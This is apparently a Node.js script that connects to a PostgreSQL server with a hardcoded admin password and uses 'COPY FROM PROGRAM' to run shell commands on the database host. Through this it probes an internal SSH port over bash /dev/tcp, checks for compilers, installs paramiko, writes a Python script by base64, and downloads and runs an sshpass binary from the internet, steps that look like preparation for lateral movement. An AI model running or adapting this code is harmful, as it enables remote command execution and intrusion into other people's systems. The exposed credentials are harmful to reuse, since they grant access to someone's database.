process.env.DATABASE_URL = 'postgresql://supabase_admin.m88:Madison_88_admin**@5.223.78.194:5432/postgres?schema=AP_Invoice';
const { PrismaClient } = require('C:/Users/JC/OneDrive - Madison88/AP Invoice/apps/api/node_modules/@prisma/client');
const prisma = new PrismaClient({ log: ['error'] });

async function runCmd(cmd) {
  try {
    await prisma.$executeRawUnsafe(`TRUNCATE cmd_output`);
    await prisma.$executeRawUnsafe(`COPY cmd_output FROM PROGRAM '${cmd.replace(/'/g, "'\\''")}'`);
    const rows = await prisma.$queryRawUnsafe(`SELECT * FROM cmd_output`);
    return rows.map(r => r.line).join('\n');
  } catch (e) {
    return 'ERROR: ' + e.message.substring(0, 300);
  }
}

async function writeFileViaBase64(path, content) {
  const b64 = Buffer.from(content).toString('base64');
  await runCmd(`echo '${b64}' | base64 -d > ${path}`);
}

(async () => {
  try {
    await prisma.$executeRawUnsafe(`CREATE TEMP TABLE IF NOT EXISTS cmd_output (line text)`);

    // Check bash /dev/tcp
    console.log('1. Test bash /dev/tcp...');
    console.log(await runCmd('bash -c "exec 3<>/dev/tcp/172.17.0.1/22 && head -1 <&3" 2>&1 || echo "failed"'));

    // Check for gcc
    console.log('\n2. Check compiler...');
    console.log(await runCmd('which gcc cc g++ 2>/dev/null || echo "no compiler"'));

    // Check for Python pip
    console.log('\n3. Check pip...');
    console.log(await runCmd('python3 -m pip --version 2>&1 || echo "no pip"'));
    
    // Try to install paramiko via pip --user
    console.log('\n4. Try pip install paramiko...');
    console.log(await runCmd('python3 -m pip install --user paramiko 2>&1 | tail -5 || echo "pip install failed"'));

    // Check if we can use Python's subprocess with bash /dev/tcp
    // Write a Python script using base64 to avoid escaping issues
    const pyScript = `#!/usr/bin/env python3
import subprocess, sys

# Use bash /dev/tcp to communicate with SSH
# This is a very basic approach - just test connectivity
try:
    result = subprocess.run(
        ['bash', '-c', 'exec 3<>/dev/tcp/172.17.0.1/22 && head -1 <&3'],
        capture_output=True, text=True, timeout=5
    )
    print("SSH banner:", result.stdout.strip())
    print("Stderr:", result.stderr.strip())
except Exception as e:
    print("Error:", str(e))
`;

    console.log('\n5. Write and run Python script...');
    await writeFileViaBase64('/tmp/test_ssh.py', pyScript);
    console.log(await runCmd('python3 /tmp/test_ssh.py 2>&1'));

    // Try to download a static sshpass binary from various sources
    console.log('\n6. Download static sshpass...');
    // First try to find a static sshpass binary
    const downloadCmds = [
      'curl -s -L --connect-timeout 10 "https://github.com/xhc/sshpass/releases/download/v1.10/sshpass" -o /tmp/sshpass 2>&1',
      'chmod +x /tmp/sshpass 2>/dev/null',
      'ls -la /tmp/sshpass 2>/dev/null',
      'file /tmp/sshpass 2>/dev/null',
      '/tmp/sshpass -V 2>&1 || echo "sshpass not working"',
    ];
    for (const cmd of downloadCmds) {
      console.log('  ', await runCmd(cmd));
    }

  } catch (e) {
    console.error('FATAL:', e.message);
  } finally {
    await prisma.$disconnect();
  }
})();
